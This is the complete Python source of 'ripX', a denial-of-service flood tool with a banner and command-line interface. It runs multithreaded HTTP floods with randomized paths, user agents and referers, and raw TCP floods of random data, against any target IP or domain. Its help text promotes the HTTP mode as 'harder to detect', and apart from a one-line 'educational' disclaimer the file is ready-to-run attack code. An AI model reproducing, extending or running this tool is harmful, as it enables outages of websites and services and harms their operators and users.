#!/usr/bin/env python3

import sys, os, time, socket, random, threading, ssl
from datetime import datetime

VERSION = "1.0.0"

BANNER = f"""
{'='*55}
{chr(27)}[91m   ██████╗ ██╗██████╗ ██╗  ██╗{chr(27)}[0m
{chr(27)}[91m   ██╔══██╗██║██╔══██╗╚██╗██╔╝{chr(27)}[0m
{chr(27)}[91m   ██████╔╝██║██████╔╝ ╚███╔╝ {chr(27)}[0m
{chr(27)}[91m   ██╔══██╗██║██╔═══╝  ██╔██╗ {chr(27)}[0m
{chr(27)}[91m   ██║  ██║██║██║     ██╔╝ ██╗{chr(27)}[0m
{chr(27)}[91m   ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝{chr(27)}[0m
{chr(27)}[92m   ═══════════════════════════════{chr(27)}[0m
{chr(27)}[92m   Flood Tool  •  v{VERSION}{chr(27)}[0m
{chr(27)}[92m   Author: Adhithya J (AdhiHub){chr(27)}[0m
{'='*55}
{chr(27)}[93m[!] For educational/testing purposes only{chr(27)}[0m
{chr(27)}[93m[!] You are responsible for your actions{chr(27)}[0m
{'='*55}
"""

METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0",
]
REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.reddit.com/", "https://www.github.com/",
    "https://www.linkedin.com/",
]

running = True; sent = 0; failed = 0; lock = threading.Lock()
start_time = 0

def log(msg, color="92"):
    t = datetime.now().strftime("%H:%M:%S")
    print(f"{chr(27)}[90m[{t}]{chr(27)}[0m {chr(27)}[{color}m{msg}{chr(27)}[0m")

def status_thread(duration):
    global sent, failed, running, start_time
    while running and time.time() - start_time < duration:
        time.sleep(1)
        remain = int(duration - (time.time() - start_time))
        with lock:
            log(f"Sent: {sent} | Failed: {failed} | Remaining: {remain}s", "94")
    running = False

def flood_http(target_ip, target_port, method, threads, duration, ssl_mode):
    global sent, failed, running
    end_time = time.time() + duration

    def worker():
        global sent, failed
        while running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                path = "/" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4, 10)))
                if ssl_mode:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=target_ip)
                sock.connect((target_ip, target_port))
                req = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip,deflate\r\n"
                    f"Referer: {random.choice(REFERERS)}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n\r\n"
                )
                sock.send(req.encode())
                with lock: sent += 1
                sock.close()
            except:
                with lock: failed += 1
                try: sock.close()
                except: pass

    threads_list = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in threads_list: t.start()
    try:
        while time.time() < end_time: time.sleep(0.1)
    except KeyboardInterrupt:
        running = False

def flood_tcp(target_ip, target_port, threads, duration):
    global sent, failed, running
    end_time = time.time() + duration
    data = random._urandom(1024)

    def worker():
        global sent, failed
        while running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                sock.send(data)
                with lock: sent += 1
                sock.close()
            except:
                with lock: failed += 1
                try: sock.close()
                except: pass

    threads_list = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in threads_list: t.start()
    try:
        while time.time() < end_time: time.sleep(0.1)
    except KeyboardInterrupt:
        running = False

def attack(target_ip, target_port, method, threads, duration, ssl_mode, mode):
    global start_time, running
    start_time = time.time()
    running = True
    log(f"Mode: {mode.upper()} | Target: {target_ip}:{target_port} | Threads: {threads} | Duration: {duration}s", "93")
    if mode == "http": log(f"Method: {method} | SSL: {ssl_mode}", "93")
    print()
    t = threading.Thread(target=status_thread, args=(duration,), daemon=True)
    t.start()
    if mode == "http":
        flood_http(target_ip, target_port, method, threads, duration, ssl_mode)
    else:
        flood_tcp(target_ip, target_port, threads, duration)

def interactive_mode():
    print(BANNER)
    print(f"{chr(27)}[96m═══════════════════════════════════════════{chr(27)}[0m")
    print(f"{chr(27)}[96m         INTERACTIVE MODE{chr(27)}[0m")
    print(f"{chr(27)}[96m═══════════════════════════════════════════{chr(27)}[0m")
    print()
    target = input(f"{chr(27)}[93m[?] Target IP or domain: {chr(27)}[0m").strip()
    if not target:
        log("Target required", "91"); sys.exit(1)
    port_str = input(f"{chr(27)}[93m[?] Port (default: 80): {chr(27)}[0m").strip()
    port = int(port_str) if port_str else 80
    mode = input(f"{chr(27)}[93m[?] Mode - http or tcp (default: http): {chr(27)}[0m").strip().lower()
    mode = mode if mode in ("http", "tcp") else "http"
    method = "GET"; ssl_mode = False
    if mode == "http":
        m = input(f"{chr(27)}[93m[?] HTTP method - GET/POST/HEAD/PUT/OPTIONS (default: GET): {chr(27)}[0m").strip().upper()
        method = m if m in METHODS else "GET"
        s = input(f"{chr(27)}[93m[?] Use SSL/HTTPS? y/N: {chr(27)}[0m").strip().lower()
        ssl_mode = s in ("y", "yes")
    t_str = input(f"{chr(27)}[93m[?] Threads (default: 100): {chr(27)}[0m").strip()
    threads = int(t_str) if t_str else 100
    d_str = input(f"{chr(27)}[93m[?] Duration in seconds (default: 60): {chr(27)}[0m").strip()
    duration = int(d_str) if d_str else 60
    return target, port, method, threads, duration, ssl_mode, mode

def show_help():
    print(BANNER)
    print(f"{chr(27)}[96mUsage:{chr(27)}[0m")
    print(f"  python ripX.py -t <target> -p <port> [options]")
    print()
    print(f"{chr(27)}[96mRequired:{chr(27)}[0m")
    print(f"  -t, --target    Target IP or domain")
    print(f"  -p, --port      Target port")
    print()
    print(f"{chr(27)}[96mModes:{chr(27)}[0m")
    print(f"  -M, --mode      Attack mode: http or tcp (default: http)")
    print(f"                    http = HTTP flood (L7, harder to detect)")
    print(f"                    tcp  = Raw TCP flood (L4, more packets)")
    print()
    print(f"{chr(27)}[96mHTTP options:{chr(27)}[0m")
    print(f"  -m, --method    HTTP method: GET, POST, HEAD, PUT, OPTIONS (default: GET)")
    print(f"  -s, --ssl       Enable SSL/HTTPS mode")
    print()
    print(f"{chr(27)}[96mGeneral:{chr(27)}[0m")
    print(f"  -d, --duration  Attack duration in seconds (default: 60)")
    print(f"  -c, --threads   Number of threads (default: 100)")
    print(f"  -h, --help      Show this help")
    print()
    print(f"{chr(27)}[96mExamples:{chr(27)}[0m")
    print(f"  ripX -t 192.168.1.1 -p 80 -c 200 -d 120            # HTTP flood")
    print(f"  ripX -t example.com -p 443 -M http -s -m POST       # HTTPS flood")
    print(f"  ripX -t 192.168.1.1 -p 80 -M tcp -c 500 -d 60      # TCP flood")
    print()
    sys.exit(0)

if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        show_help()

    target = None; port = 80; method = "GET"; duration = 60; threads = 100
    ssl_mode = False; mode = "http"

    if len(sys.argv) < 2:
        target, port, method, threads, duration, ssl_mode, mode = interactive_mode()
    else:
        args = sys.argv[1:]; i = 0
        while i < len(args):
            if args[i] in ("-t", "--target") and i+1 < len(args): target = args[i+1]; i += 2
            elif args[i] in ("-p", "--port") and i+1 < len(args): port = int(args[i+1]); i += 2
            elif args[i] in ("-m", "--method") and i+1 < len(args): method = args[i+1].upper(); i += 2
            elif args[i] in ("-d", "--duration") and i+1 < len(args): duration = int(args[i+1]); i += 2
            elif args[i] in ("-c", "--threads") and i+1 < len(args): threads = int(args[i+1]); i += 2
            elif args[i] in ("-M", "--mode") and i+1 < len(args): mode = args[i+1].lower(); i += 2
            elif args[i] in ("-s", "--ssl"): ssl_mode = True; i += 1
            else: i += 1

    if not target:
        print(f"{chr(27)}[91m[!] Target required. Use -h for help.{chr(27)}[0m")
        sys.exit(1)
    if mode not in ("http", "tcp"):
        print(f"{chr(27)}[91m[!] Invalid mode. Use http or tcp.{chr(27)}[0m")
        sys.exit(1)
    if method not in METHODS:
        print(f"{chr(27)}[91m[!] Invalid method. Use: {', '.join(METHODS)}{chr(27)}[0m")
        sys.exit(1)

    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

    try:
        ip = socket.gethostbyname(target)
        log(f"Resolved {target} → {ip}", "92")
        target = ip
    except:
        log(f"Cannot resolve target: {target}", "91")
        sys.exit(1)

    attack(target, port, method, threads, duration, ssl_mode, mode)
